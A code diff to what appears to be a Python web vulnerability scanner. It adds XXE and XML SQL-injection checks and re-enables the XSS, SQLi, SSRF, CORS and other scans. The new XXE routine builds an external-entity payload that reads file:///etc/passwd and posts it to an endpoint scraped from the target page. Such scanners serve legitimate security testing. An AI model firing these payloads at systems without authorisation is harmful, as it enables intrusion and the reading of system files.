@@ -801,6 +801,21 @@ class Utilities(ScanConfigParameters):
             print(Fore.RESET)
             pass
 
+    def extract_xml_tags(self, url):
+        try:
+            pattern_tags = r'xmlHttp\.send\("([^"]+)"\);'
+            pattern_uri = r'xmlHttp\.open\("POST","([^"]+)"'
+            match_tags = re.search(pattern_tags, self.session.get(url).text, re.DOTALL)
+            match_uri = re.search(pattern_uri, self.session.get(url).text, re.DOTALL)
+
+            if match_tags and match_uri:
+                extracted_xml = match_tags.group(1)
+                extracted_uri = match_uri.group(1)
+                return extracted_uri, extracted_xml
+            return None, None
+        except Exception as e:
+            self.print_except_message('error', e, "Something went wrong when extracting XML tags.", url)
+            pass
 
 # Scanner class handles scan jobs
 class Scanner(Utilities):
@@ -817,24 +832,24 @@ class Scanner(Utilities):
             # Scan harvested URLs
             for url in self.DataStorage.urls:
                 # Form and URL scan
-                # self.scan_html(url)
-                # self.scan_iframe(url)
-                # self.scan_code_exec(url)
-                # self.scan_php_exec(url)
-                # self.scan_ssi(url)
-                # self.scan_sql(url)
-                # self.scan_role_def_dir(url)
-                # self.scan_role_def_cookie(url)
+                self.scan_html(url)
+                self.scan_iframe(url)
+                self.scan_code_exec(url)
+                self.scan_php_exec(url)
+                self.scan_ssi(url)
+                self.scan_sql(url)
+                self.scan_role_def_dir(url)
+                self.scan_role_def_cookie(url)
                 # # self.scan_browser_cache(url) # Ok, just whole app is vuln, temp comment
                 # # self.scan_session(url) # TODO : Fix Strong Sessions
-                # self.scan_xss(url)
-                self.t_i_xml(url)  # Fixing in progress
-                # self.scan_idor(url)
-                # self.scan_cors(url)
-                # self.scan_xst(url)
-                # self.scan_robotstxt(url)
-                # self.scan_hhi(url)
-                # self.scan_ssrf(url)
+                self.scan_xss(url)
+                self.scan_idor(url)
+                self.scan_cors(url)
+                self.scan_xst(url)
+                self.scan_robotstxt(url)
+                self.scan_hhi(url)
+                self.scan_ssrf(url)
+                self.scan_xml_generic(url)
 
                 html_report.write_html_report()  # TODO: Prettify report
             return
@@ -919,12 +934,11 @@ class Scanner(Utilities):
                                       "Something went wrong when testing for SQL Injection with no form inputs.", url)
             pass
 
-    def t_ua_sql(self, url):
+    def t_i_ua_sql(self, url):
         try:
             # Get Initial ~ normal response time with no Payload
             response_time_wo = self.session.get(url, timeout=300).elapsed.total_seconds()
             # Check only one time injection as it keeps the app loading for a long time if all time payloads are injected
-            time_based = False
             for sql_payload in self.DataStorage.payloads("SQL"):
                 # Inject headers with payloads
                 headers = self.custom_user_agent(sql_payload)
@@ -933,14 +947,40 @@ class Scanner(Utilities):
                 except Exception:
                     continue
                 # Check response type (time or feedback)
-                if time_based is False and response.elapsed.total_seconds() > response_time_wo and response.elapsed.total_seconds() > 2:
-                    time_based = True
-                    continue
+                if response.elapsed.total_seconds() > response_time_wo and response.elapsed.total_seconds() > 2:
+                    return True
                 if "error" in response.text.lower():  # TODO: Might need to create other detection condition.
                     return True
             return False
         except Exception as e:
             self.print_except_message('error', e, "Something went wrong when testing for User-Agent SQL Injection.",
+                                      url)
+            pass
+
+    def t_i_xml_sql(self, url):
+        try:
+            # Get Initial ~ normal response time with no Payload
+            response_time_wo = self.session.get(url, timeout=300).elapsed.total_seconds()
+            # Check only one time injection as it keeps the app loading for a long time if all time payloads are injected
+            for sql_payload in self.DataStorage.payloads("SQL"):
+                # Inject XML with custom payloads
+                prepared_url, custom_payload = self.t_i_xml(url, sql_payload)
+                if prepared_url and custom_payload:
+                    try:
+                        response = self.session.post(prepared_url, data=custom_payload, headers={'Content-Type': 'application/xml'})
+                    except Exception:
+                        continue
+                else:
+                    break
+                # Check response type (time or feedback)
+                if response.elapsed.total_seconds() > response_time_wo and response.elapsed.total_seconds() > 2:
+                    return True
+                if "error" in response.text.lower():  # TODO: Might need to create other detection condition.
+
+                    return True
+            return False
+        except Exception as e:
+            self.print_except_message('error', e, "Something went wrong when testing for SQL Injection in XML tags.",
                                       url)
             pass
 
@@ -961,7 +1001,7 @@ class Scanner(Utilities):
                                                       'SQL Injection vulnerability identified on form. URL: {}. Vulnerability Type: {}'.format(
                                                           url, sql_type), 'Critical')
             # Bulk up User-Agent SQL Injection detection in the same function
-            if self.t_ua_sql(url):
+            if self.t_i_ua_sql(url):
                 html_report.add_vulnerability('SQL Injection - User Agent',
                                               'SQL Injection vulnerability identified on URL: {} using custom User-Agent.'.format(
                                                   url), 'Critical')
@@ -971,6 +1011,11 @@ class Scanner(Utilities):
                 html_report.add_vulnerability('SQL Injection',
                                               'Time based (Blind) SQL Injection vulnerability identified on URL: {}.'.format(
                                                   url), 'Medium')
+
+            if self.t_i_xml_sql(url):
+                html_report.add_vulnerability('SQL Injection in XML tag',
+                                              'SQL Injection in XML tag vulnerability identified on URL: {} using custom XML tags.'.format(
+                                                  url), 'Critical')
             return
         except Exception as e:
             self.print_except_message('error', e, "Something went wrong when testing for SQL Injection.", url)
@@ -1209,19 +1254,51 @@ class Scanner(Utilities):
                                       url)
             pass
 
-    def t_i_xml(self, url):  # TODO: Check why XEE is not ran properly.
+    def t_i_xml(self, url, payload):
         try:
-            payload = 'file:///etc/passwd'
-            xml_payload = '''<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "'"> ]>
-<reset>
-<login>bee</login>
-<secret>Any bugs?</secret>
-</reset>'''  # .format(payload)
-            print(self.session.post(url, data=xml_payload, headers={'Content-Type': 'application/xml'}).content)
-            return False
+            extracted_uri, extracted_tag = self.extract_xml_tags(url)
+            if extracted_uri and extracted_tag:
+                prepared_tag =  re.sub(r'(<[^>]+>)([^<]+)(</[^>]+>)', r'\1' + '&XXE;' + r'\3', extracted_tag, count=1)
+
+                xml_payload = '''<?xml version="1.0" encoding="utf-8"?>
+                <!DOCTYPE root [<!ENTITY XXE SYSTEM "{}"> ]>
+                {}'''.format(payload, prepared_tag)
+
+                pattern_url = r'(.*/)[^/]+$'
+                prepared_url = re.sub(pattern_url, r'\1' + extracted_uri, url)
+
+                return prepared_url, xml_payload
+                # if 'root:' in str(self.session.post(prepared_url, data=xml_payload, headers={'Content-Type': 'application/xml'}).content):
+                #     return True, 'HIGH'
+            else:
+                xml_payload = '''<?xml version="1.0" encoding="utf-8"?>
+                                <!DOCTYPE root [<!ENTITY XXE SYSTEM "{}"> ]>
+                                <bongus><bongus2>&XXE</bongus2><bongus3>&XXE</bongus3></bongus>'''.format(payload)
+                # if 'error' in str(self.session.post(url, data=xml_payload, headers={'Content-Type': 'application/xml'}).content):
+                #     return True, 'Low'
+                return None, xml_payload
         except Exception as e:
             self.print_except_message('error', e, "Something went wrong when testing for XML Injection.", url)
+            pass
+        
+    def scan_xml_generic(self, url):
+        try:
+            payload = 'file:///etc/passwd' # TODO: Might need to add other payloads
+            custom_url, custom_payload = self.t_i_xml(url, payload)
+            if custom_url and custom_payload:
+                response = self.session.post(custom_url, data=custom_payload, headers={'Content-Type': 'application/xml'})
+                if 'root' in response.text.lower():
+                    html_report.add_vulnerability('XXE Injection',
+                                                  'XXE Injection Vulnerability identified on URL: {}.'.format(
+                                                      url), 'Critical')
+            elif custom_url is None and custom_payload:
+                if 'error' in str(self.session.post(url, data=payload, headers={'Content-Type': 'application/xml'}).content):
+                    html_report.add_vulnerability('XXE Injection',
+                                                  'XXE Injection Vulnerability identified on URL: {}.'.format(
+                                                      url), 'High')
+            return
+        except Exception as e:
+            self.print_except_message('error', e, "Something went wrong when testing for Generic XML Injection.", url)
             pass
 
     # Broken Authentication & Session Mgmt
